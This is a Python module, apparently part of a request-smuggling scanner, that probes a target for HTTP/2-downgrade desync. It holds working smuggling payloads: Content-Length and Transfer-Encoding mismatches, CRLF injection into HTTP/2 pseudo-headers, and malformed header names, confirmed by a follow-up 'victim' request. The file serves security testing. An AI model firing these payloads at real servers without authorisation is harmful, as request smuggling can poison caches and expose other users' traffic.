import random
from lib.Payload import RawPayload
from lib.EasySSL import EasyH2, EasySSL, H2_AVAILABLE


# Gadget paths whose responses contain a recognizable token that's unlikely to
# appear in the target's normal endpoint response. The smuggled prefix targets
# one of these; a successful desync surfaces the gadget token on a *follow-up
# H1 victim request*, not on the original H2 stream.
H2_GADGETS = [
	{"path": "/robots.txt", "token": "llow:"},
	{"path": "/sitemap.xml", "token": "<urlset"},
	{"path": "/favicon.ico", "token": "image/"},
]


def _filter_response(headers, data):
	status = headers.get(':status', '')
	result = "HTTP/2 %s\r\n" % status
	for k, v in headers.items():
		if k != ':status':
			result += "%s: %s\r\n" % (k, v)
	result += "\r\n"
	if data:
		result += data.decode('latin-1', errors='replace')
	return result


def _filter_bytes(res):
	if res is None:
		return ""
	if isinstance(res, bytes):
		out = ""
		for b in res:
			if b > 0x7F:
				out += '\x30'
			else:
				out += chr(b)
		return out
	return res


class ScanH2Desync:
	name = "HTTP/2 Downgrade Smuggling"

	H2_PERMUTATIONS = {
		"h2cl-basic": {
			"desc": "H2.CL: Mismatched Content-Length causes backend to read past boundary",
			"technique": "h2cl",
		},
		"h2te-basic": {
			"desc": "H2.TE: Injected Transfer-Encoding processed by backend after downgrade",
			"technique": "h2te",
		},
		"h2te-hide": {
			"desc": "H2.TE via header injection in pseudo-header",
			"technique": "h2te-hide",
		},
		"h2-authority": {
			"desc": "H2 tunneling via :authority pseudo-header CRLF injection",
			"technique": "h2-authority",
		},
		"h2-path": {
			"desc": "H2 tunneling via :path pseudo-header with request line injection",
			"technique": "h2-path",
		},
		"h2-method": {
			"desc": "H2 tunneling via :method pseudo-header with request line injection",
			"technique": "h2-method",
		},
		"h2-scheme": {
			"desc": "H2 tunneling via :scheme pseudo-header injection",
			"technique": "h2-scheme",
		},
		"h2-colon": {
			"desc": "H2 header name with backtick colon confusion",
			"technique": "h2-colon",
		},
		"h2-case": {
			"desc": "H2 lowercase header name bypassing case-sensitive frontend",
			"technique": "h2-case",
		},
		"h2-prefix": {
			"desc": "H2 colon-prefixed header name mimicking pseudo-header",
			"technique": "h2-prefix",
		},
		"h2-space": {
			"desc": "H2 space in header name confusion",
			"technique": "h2-space",
		},
	}

	def __init__(self, host, port, ssl_flag, timeout, method, endpoint, vhost, proxy, logh, quiet, cookies, extra_headers=None):
		self.host = host
		self.port = port
		self.ssl_flag = ssl_flag
		self.timeout = timeout
		self.method = method
		self.endpoint = endpoint
		self.vhost = vhost or host
		self.proxy = proxy
		self.logh = logh
		self.quiet = quiet
		self.cookies = cookies
		self.extra_headers = extra_headers or []

	def _test_h2_support(self):
		if not H2_AVAILABLE:
			return False
		try:
			h2c = EasyH2()
			h2c.connect(self.host, self.port, self.timeout, self.proxy)
			stream_id = h2c.send_request("GET", self.endpoint,
				headers=[('content-length', '0')])
			headers, data = h2c.recv_response(stream_id, self.timeout)
			h2c.close()
			return ':status' in headers
		except Exception:
			return False

	def _select_h2_gadget(self):
		"""Pick a gadget whose token does NOT already appear on the baseline H1
		response (otherwise we can't tell a smuggled response apart). Returns
		the gadget dict or None if no usable gadget is available."""
		for gadget in H2_GADGETS:
			try:
				web = EasySSL(self.ssl_flag)
				web.connect(self.host, self.port, self.timeout, self.proxy)
				cb = str(random.random()).split('.')[1]
				probe_req = (
					"GET %s?cb=%s HTTP/1.1\r\nHost: %s\r\n"
					"User-Agent: smuggler\r\nConnection: close\r\n\r\n"
					% (gadget["path"], cb, self.vhost)
				)
				web.send(probe_req.encode())
				gadget_resp = _filter_bytes(web.recv_all(self.timeout))
				web.close()
				if not gadget_resp or gadget["token"] not in gadget_resp:
					continue

				# Now verify the token is absent from a normal endpoint hit.
				web2 = EasySSL(self.ssl_flag)
				web2.connect(self.host, self.port, self.timeout, self.proxy)
				cb2 = str(random.random()).split('.')[1]
				base_req = (
					"GET %s?cb=%s HTTP/1.1\r\nHost: %s\r\n"
					"User-Agent: smuggler\r\nConnection: close\r\n\r\n"
					% (self.endpoint, cb2, self.vhost)
				)
				web2.send(base_req.encode())
				base_resp = _filter_bytes(web2.recv_all(self.timeout))
				web2.close()
				if base_resp and gadget["token"] in base_resp:
					continue
				return gadget
			except Exception:
				continue
		return None

	def _send_victim(self):
		"""Send a normal H1 GET to the target endpoint on a fresh connection,
		return filtered response string (or '' on error). This is the victim
		request that surfaces a smuggled prefix."""
		try:
			web = EasySSL(self.ssl_flag)
			web.connect(self.host, self.port, self.timeout, self.proxy)
			cb = str(random.random()).split('.')[1]
			req = (
				"GET %s?cb=%s HTTP/1.1\r\nHost: %s\r\n"
				"User-Agent: smuggler\r\nConnection: close\r\n\r\n"
				% (self.endpoint, cb, self.vhost)
			)
			web.send(req.encode())
			res = web.recv_all(self.timeout)
			web.close()
			return _filter_bytes(res)
		except Exception:
			return ""

	def _probe(self, technique, gadget):
		smuggled = "GET %s HTTP/1.1\r\nHost: %s\r\nFoo: bar" % (gadget["path"], self.vhost)
		cb = str(random.random()).split('.')[1]
		path = "%s?cb=%s" % (self.endpoint, cb)

		# Extra header tuples appended to every permutation's header list:
		# cookies plus the user's custom request headers (Authorization, X-Dtc,
		# ...). Framing/hop-by-hop headers are already filtered out at parse
		# time, so nothing here can corrupt the H2 downgrade probe. Names are
		# lowercased per HTTP/2's requirement that regular header names be
		# lowercase.
		request_headers = []
		if self.cookies:
			request_headers.append(('cookie', ''.join(self.cookies)))
		for h in self.extra_headers:
			name, sep, value = h.partition(':')
			if sep:
				request_headers.append((name.strip().lower(), value.strip()))

		try:
			h2c = EasyH2()
			h2c.connect(self.host, self.port, self.timeout, self.proxy)

			if technique == "h2cl":
				hdrs = [
					(':method', self.method),
					(':path', path),
					(':authority', self.vhost),
					(':scheme', 'https'),
					('content-type', 'application/x-www-form-urlencoded'),
					('content-length', str(len(smuggled))),
				] + request_headers
				stream_id = h2c.send_raw_headers(hdrs, body=smuggled + "PADDING_TO_EXCEED_CL")

			elif technique == "h2te":
				hdrs = [
					(':method', self.method),
					(':path', path),
					(':authority', self.vhost),
					(':scheme', 'https'),
					('content-type', 'application/x-www-form-urlencoded'),
					('transfer-encoding', 'chunked'),
				] + request_headers
				body = "0\r\n\r\n" + smuggled
				stream_id = h2c.send_raw_headers(hdrs, body=body)

			elif technique == "h2te-hide":
				hdrs = [
					(':method', self.method),
					(':path', path),
					(':authority', self.vhost),
					(':scheme', 'https'),
					('content-type', 'application/x-www-form-urlencoded'),
					('foo', 'bar\r\ntransfer-encoding: chunked'),
				] + request_headers
				body = "0\r\n\r\n" + smuggled
				stream_id = h2c.send_raw_headers(hdrs, body=body)

			elif technique == "h2-authority":
				hdrs = [
					(':method', self.method),
					(':path', path),
					(':authority', self.vhost + ":443\r\ntransfer-encoding: chunked\r\nx: x"),
					(':scheme', 'https'),
					('content-type', 'application/x-www-form-urlencoded'),
				] + request_headers
				body = "0\r\n\r\n" + smuggled
				stream_id = h2c.send_raw_headers(hdrs, body=body)

			elif technique == "h2-path":
				injected_path = path + " HTTP/1.1\r\ntransfer-encoding: chunked\r\nx: x"
				hdrs = [
					(':method', self.method),
					(':path', injected_path),
					(':authority', self.vhost),
					(':scheme', 'https'),
					('content-type', 'application/x-www-form-urlencoded'),
				] + request_headers
				body = "0\r\n\r\n" + smuggled
				stream_id = h2c.send_raw_headers(hdrs, body=body)

			elif technique == "h2-method":
				hdrs = [
					(':method', 'POST ' + path + ' HTTP/1.1\r\ntransfer-encoding: chunked\r\nx: x'),
					(':path', path),
					(':authority', self.vhost),
					(':scheme', 'https'),
					('content-type', 'application/x-www-form-urlencoded'),
				] + request_headers
				body = "0\r\n\r\n" + smuggled
				stream_id = h2c.send_raw_headers(hdrs, body=body)

			elif technique == "h2-scheme":
				hdrs = [
					(':method', self.method),
					(':path', path),
					(':authority', self.vhost),
					(':scheme', 'https://' + self.vhost + path + ' HTTP/1.1\r\ntransfer-encoding: chunked\r\nx: x'),
					('content-type', 'application/x-www-form-urlencoded'),
				] + request_headers
				body = "0\r\n\r\n" + smuggled
				stream_id = h2c.send_raw_headers(hdrs, body=body)

			elif technique == "h2-colon":
				hdrs = [
					(':method', self.method),
					(':path', path),
					(':authority', self.vhost),
					(':scheme', 'https'),
					('content-type', 'application/x-www-form-urlencoded'),
					('transfer-encoding`chunked', 'chunked'),
				] + request_headers
				body = "0\r\n\r\n" + smuggled
				stream_id = h2c.send_raw_headers(hdrs, body=body)

			elif technique == "h2-case":
				hdrs = [
					(':method', self.method),
					(':path', path),
					(':authority', self.vhost),
					(':scheme', 'https'),
					('content-type', 'application/x-www-form-urlencoded'),
					('Transfer-Encoding', 'chunked'),
				] + request_headers
				body = "0\r\n\r\n" + smuggled
				stream_id = h2c.send_raw_headers(hdrs, body=body)

			elif technique == "h2-prefix":
				hdrs = [
					(':method', self.method),
					(':path', path),
					(':authority', self.vhost),
					(':scheme', 'https'),
					('content-type', 'application/x-www-form-urlencoded'),
					(':transfer-encoding', 'chunked'),
				] + request_headers
				body = "0\r\n\r\n" + smuggled
				stream_id = h2c.send_raw_headers(hdrs, body=body)

			elif technique == "h2-space":
				hdrs = [
					(':method', self.method),
					(':path', path),
					(':authority', self.vhost),
					(':scheme', 'https'),
					('content-type', 'application/x-www-form-urlencoded'),
					('transfer-encoding chunked', 'chunked'),
				] + request_headers
				body = "0\r\n\r\n" + smuggled
				stream_id = h2c.send_raw_headers(hdrs, body=body)

			else:
				h2c.close()
				return None, None

			headers, data = h2c.recv_response(stream_id, self.timeout)
			h2c.close()
			return headers, data

		except Exception as e:
			return None, None

	def confirm_permutation(self, perm_name, attempts=5, needed=3):
		"""Re-drive a single named permutation for the self-contained
		confirmer. Re-runs the H2 downgrade probe and an own H1 follow-up
		(``_send_victim``), and reports a verdict based on the same
		gadget-token-leak signal ``run`` uses -- no third-party traffic is
		ever involved. Returns a result dict; never raises."""
		result = {
			"perm_name": perm_name,
			"available": H2_AVAILABLE,
			"supported": None,
			"gadget": None,
			"confirmed": False,
			"hits": 0,
			"victim": "",
			"detail": "",
		}
		if not H2_AVAILABLE:
			result["detail"] = "h2 library not installed (pip install h2)"
			return result
		info = self.H2_PERMUTATIONS.get(perm_name)
		if not info:
			result["detail"] = "unknown H2 permutation: %s" % perm_name
			return result
		result["technique"] = info["technique"]
		try:
			supported = self._test_h2_support()
		except Exception:
			supported = False
		result["supported"] = supported
		if not supported:
			result["detail"] = "target does not negotiate HTTP/2"
			return result
		gadget = self._select_h2_gadget()
		if not gadget:
			result["detail"] = "no usable gadget for victim-confirmation"
			return result
		result["gadget"] = gadget
		technique = info["technique"]
		confirmed = 0
		for attempt in range(attempts):
			headers, data = self._probe(technique, gadget)
			if headers is None:
				if attempt >= 1:
					break
				continue
			victim_resp = self._send_victim()
			if victim_resp and gadget["token"] in victim_resp:
				confirmed += 1
				result["victim"] = victim_resp[:2000]
				if confirmed >= needed:
					break
		result["hits"] = confirmed
		result["confirmed"] = confirmed >= needed
		result["detail"] = "gadget=%s token=%r victim-leaks=%d/%d" % (
			gadget["path"], gadget["token"], confirmed, needed)
		return result

	def run(self, print_fn, write_fn):
		if not H2_AVAILABLE:
			print_fn("H2", "h2 library not installed (pip install h2), skipping HTTP/2 scans")
			return False

		if not self._test_h2_support():
			print_fn("H2", "Target does not support HTTP/2, skipping")
			return False

		gadget = self._select_h2_gadget()
		if not gadget:
			print_fn("H2", "No usable gadget for victim-confirmation, skipping H2 scans")
			return False

		print_fn("H2", "HTTP/2 support confirmed, gadget=%s token=%r, testing %d permutations..." % (
			gadget["path"], gadget["token"], len(self.H2_PERMUTATIONS)))
		found = False

		for perm_name, perm_info in self.H2_PERMUTATIONS.items():
			technique = perm_info["technique"]
			desc = perm_info["desc"]

			confirmed = 0
			for attempt in range(5):
				headers, data = self._probe(technique, gadget)
				if headers is None:
					# Stream failed entirely (e.g. RST_STREAM); retry once
					# more, but don't wedge the whole permutation.
					if attempt >= 1:
						break
					continue

				# True desync detection: did the *follow-up* victim request
				# leak the smuggled gadget? The H2 stream itself can't carry
				# a smuggled HTTP/1 response back, so checking it is wrong.
				victim_resp = self._send_victim()
				if victim_resp and gadget["token"] in victim_resp:
					confirmed += 1
					if confirmed >= 3:
						print_fn("H2", "Confirmed %s (victim leak): %s" % (perm_name, desc))
						raw = RawPayload()
						raw.data = ("# %s\n# %s\n# gadget=%s token=%r\n" % (
							perm_name, desc, gadget["path"], gadget["token"]
						)).encode('latin-1')
						write_fn(self.host, raw, "H2_%s" % perm_name,
							response=victim_resp, details={
								"scan": "h2",
								"label": perm_name,
								"mutation": technique,
								"gadget_hit": True,
							})
						found = True
						break

		if not found:
			print_fn("H2", "No HTTP/2 desync vulnerabilities detected")
		return found
